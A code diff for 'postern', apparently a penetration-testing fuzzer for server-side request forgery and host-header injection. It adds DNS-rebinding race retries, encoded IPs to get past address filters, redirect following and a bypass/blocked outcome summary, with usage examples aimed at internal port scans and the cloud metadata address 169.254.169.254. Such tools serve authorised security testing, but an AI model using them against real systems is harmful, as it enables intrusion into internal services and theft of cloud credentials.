@@ -63,8 +63,12 @@ type config struct {
 	sweep            string
 	sweepEnc         string
 	rebind           string
+	rebindOnly       bool
+	repeat           int
 	ports            string
 	scanHost         string
+	scanEnc          string
+	followRedirects  int
 	path             string
 	paths            string
 	payloads         string
@@ -175,8 +179,11 @@ SSRF:
   -sweep <spec>           /24 last-octet sweep: "private" or "10.10.10,192.168.56"
   -sweep-encode <spec>    encode swept IPs to bypass filters: "all" or "decimal,hex"
   -rebind <ext:int>       DNS-rebinding hosts (1u.ms, rbndr.us) for TOCTOU filters
+  -rebind-only            generate only -rebind cases (pair with -repeat)
+  -repeat <n>             send each case n times (race / rebind retries)
   -ports <spec>           port-scan via SSRF: top | all | CSV | range (80,6379|1-1024)
   -scan-host <host>       host to port-scan  (default 127.0.0.1)
+  -scan-encode <spec>     encode the -scan-host host: "all" or "decimal,hex"
 
 HOST-HEADER:
   -probe                  probe headers first, drop the ineffective ones (keep core)
@@ -192,6 +199,7 @@ PLACEHOLDERS:
 DETECTION:
   -match <list>           extra body signatures (comma-separated) = strong hit
   -lenpct <n>             body-length delta percent to flag  (default 25)
+  -follow-redirects <n>   follow up to n 3xx hops to the final response (off)
   -timing                 flag slow responses as hits (off; noisy on VPN/THM)
   -interactsh             built-in interactsh client for blind OOB (auto-confirm)
   -interactsh-server <u>  self-hosted interactsh server  (default public)
@@ -240,6 +248,12 @@ EXAMPLES:
   # network scan: every private host x common ports, go gently
   postern -r req.txt -mode ssrf -p url -sweep private -ports 80,443,6379 -rate 10
 
+  # scan behind a filter that blocks plain IPs but resolves decimal
+  postern -r req.txt -mode ssrf -p url -scan-host 172.28.0.20 -scan-encode decimal -ports 5000,5432
+
+  # hammer only the rebinding payloads to win a TOCTOU race
+  postern -r req.txt -mode ssrf -p url -rebind-only -rebind 1.2.3.4:169.254.169.254 -repeat 50 -follow-redirects 3
+
   # run everything through Burp and print all results
   postern -r req.txt -mode both -proxy 127.0.0.1:8080 -v
 `
@@ -281,8 +295,12 @@ func parseFlags() *config {
 	flag.StringVar(&cfg.sweep, "sweep", "", "last-octet /24 sweep: 'private' or custom list like '10.10.10,192.168.56'")
 	flag.StringVar(&cfg.sweepEnc, "sweep-encode", "", "encode swept IPs to bypass filters: 'all' or CSV 'decimal,hex,octal' (use after a bypass is found)")
 	flag.StringVar(&cfg.rebind, "rebind", "", "DNS rebinding bypass: 'ext:int' IPs, or 'int' (ext defaults 1.2.3.4); builds 1u.ms/rbndr.us hosts")
+	flag.BoolVar(&cfg.rebindOnly, "rebind-only", false, "generate only -rebind cases (skip the standard SSRF set); pair with -repeat to win TOCTOU races")
+	flag.IntVar(&cfg.repeat, "repeat", 1, "send each case this many times (race conditions / DNS-rebinding retries)")
 	flag.StringVar(&cfg.ports, "ports", "", "post-SSRF scan: port spec 'top', CSV '80,6379', or range '1-1024' (ssrf mode)")
 	flag.StringVar(&cfg.scanHost, "scan-host", "", "post-SSRF scan: host to port-scan (default 127.0.0.1; or use -sweep for a network scan)")
+	flag.StringVar(&cfg.scanEnc, "scan-encode", "", "encode the -scan-host host to bypass filters: 'all' or CSV 'decimal,hex,octal' (backend must resolve it)")
+	flag.IntVar(&cfg.followRedirects, "follow-redirects", 0, "follow up to N 3xx hops to the final response (0 = off; useful for redirect/rebind chains)")
 	flag.StringVar(&cfg.path, "path", "", "host mode: single request path to use (e.g. /admin), overrides the request path")
 	flag.StringVar(&cfg.paths, "paths", "", "host mode: path list - 'default' (built-in paths.txt) or a file; multiplies the host matrix")
 	flag.StringVar(&cfg.payloads, "payloads", "payloads", "payload directory to override the embedded lists")
@@ -459,11 +477,15 @@ func run(cfg *config) error {
 		}
 		hostHdr = strings.TrimSuffix(strings.TrimPrefix(h, "["), "]")
 	}
-	params := gen.Params{LHOST: cfg.lhost, TARGET: cfg.itarget, EVIL: cfg.evil, HOST: hostHdr, Sweep: parseSweep(cfg.sweep), SweepEnc: parseSweepEnc(cfg.sweepEnc), ScanHosts: scanHosts, Ports: ports, Rebind: rebindHosts}
+	if cfg.rebindOnly && len(rebindHosts) == 0 {
+		return fmt.Errorf("-rebind-only requires -rebind")
+	}
+	params := gen.Params{LHOST: cfg.lhost, TARGET: cfg.itarget, EVIL: cfg.evil, HOST: hostHdr, Sweep: parseSweep(cfg.sweep), SweepEnc: parseSweepEnc(cfg.sweepEnc), ScanEnc: parseSweepEnc(cfg.scanEnc), ScanHosts: scanHosts, Ports: ports, Rebind: rebindHosts, RebindOnly: cfg.rebindOnly}
 
 	sopts := sender.Options{
 		DialAddr: dialAddr, TLS: useTLS, Proxy: cfg.proxy, TargetHost: targetHost,
 		Method: base.Method, SNI: sni, Insecure: cfg.insecure, Timeout: cfg.timeout, Retries: cfg.retries,
+		FollowRedirects: cfg.followRedirects,
 	}
 
 	fmt.Printf("[*] target: %s  TLS=%v  proxy=%q  method=%s\n", targetHost, useTLS, cfg.proxy, base.Method)
@@ -526,6 +548,19 @@ func run(cfg *config) error {
 	}
 	if len(cases) == 0 {
 		return fmt.Errorf("no cases generated (check payload files and placeholders)")
+	}
+
+	if cfg.repeat > 1 {
+		orig := cases
+		cases = make([]gen.Case, 0, len(orig)*cfg.repeat)
+		for r := 0; r < cfg.repeat; r++ {
+			for _, c := range orig {
+				if r > 0 {
+					c.ID = fmt.Sprintf("%s.%d", c.ID, r)
+				}
+				cases = append(cases, c)
+			}
+		}
 	}
 
 	if cfg.max > 0 && len(cases) > cfg.max {
@@ -642,6 +677,10 @@ func run(cfg *config) error {
 
 		recordCluster(fmt.Sprintf("%d/%d", res.Status, res.BodyLen), short(c.Label, 50))
 		sig := detect.Analyze(bl, res.Status, res.Body, res.Duration, markers, cfg.lenPct, c.Payload, res.Header, cfg.timing)
+		if res.Redirects > 0 {
+			sig.Interesting = true
+			sig.Reasons = append(sig.Reasons, fmt.Sprintf("followed %dr", res.Redirects))
+		}
 		if sig.Strong {
 			atomic.AddInt64(&nStrong, 1)
 		}
@@ -758,6 +797,32 @@ type cluster struct {
 	example string
 }
 
+// clusterCategory maps a cluster signature ("status/len" or "ERR") to a semantic
+// outcome class so the summary reads as BLOCKED / ERROR / BYPASS at a glance.
+func clusterCategory(sig string) string {
+	if sig == "ERR" {
+		return "NORESP"
+	}
+	slash := strings.IndexByte(sig, '/')
+	if slash < 0 {
+		return "OTHER"
+	}
+	status, err := strconv.Atoi(sig[:slash])
+	if err != nil {
+		return "OTHER"
+	}
+	switch {
+	case status >= 200 && status < 300:
+		return "BYPASS"
+	case status >= 400 && status < 500:
+		return "BLOCKED"
+	case status >= 500:
+		return "ERROR"
+	default:
+		return "OTHER"
+	}
+}
+
 func printClusters(clusters map[string]*cluster) {
 	if len(clusters) == 0 {
 		return
@@ -771,6 +836,45 @@ func printClusters(clusters map[string]*cluster) {
 		all = append(all, kv{s, c})
 	}
 	sort.Slice(all, func(i, j int) bool { return all[i].c.count < all[j].c.count })
+
+	// Semantic rollup: what actually happened, by response class.
+	var bypass, errored, blocked, other, noResp int
+	var bypassEx, errEx string
+	for _, e := range all {
+		switch clusterCategory(e.sig) {
+		case "BYPASS":
+			bypass += e.c.count
+			if bypassEx == "" {
+				bypassEx = e.c.example
+			}
+		case "ERROR":
+			errored += e.c.count
+			if errEx == "" {
+				errEx = e.c.example
+			}
+		case "BLOCKED":
+			blocked += e.c.count
+		case "NORESP":
+			noResp += e.c.count
+		default:
+			other += e.c.count
+		}
+	}
+	fmt.Println("[*] outcome summary:")
+	fmt.Printf("      BYPASS  (2xx, filter passed + backend served): %d", bypass)
+	if bypassEx != "" {
+		fmt.Printf("   e.g. %s", short(bypassEx, 45))
+	}
+	fmt.Println()
+	fmt.Printf("      ERROR   (5xx, filter passed + backend broke) : %d", errored)
+	if errEx != "" {
+		fmt.Printf("   e.g. %s", short(errEx, 45))
+	}
+	fmt.Println()
+	fmt.Printf("      BLOCKED (4xx, filter caught it)              : %d\n", blocked)
+	fmt.Printf("      OTHER   (1xx/3xx)                            : %d\n", other)
+	fmt.Printf("      NO-RESP (network error / no reply)           : %d\n", noResp)
+
 	fmt.Printf("[*] response clusters (status/len, rare first) - %d unique:\n", len(all))
 	limit := len(all)
 	if limit > 20 {
@@ -964,7 +1068,7 @@ func writeJSON(f *os.File, mu *sync.Mutex, c gen.Case, res sender.Result, sig de
 		"id": c.ID, "mode": c.Mode, "source": c.Source,
 		"payload": c.Payload, "header": c.Header, "variant": c.Variant, "tag": c.Tag,
 		"oob": c.OOB, "status": res.Status, "len": res.BodyLen,
-		"dur_ms":      res.Duration.Milliseconds(),
+		"dur_ms": res.Duration.Milliseconds(), "redirects": res.Redirects,
 		"interesting": sig.Interesting, "strong": sig.Strong,
 		"reasons": sig.Reasons,
 	}
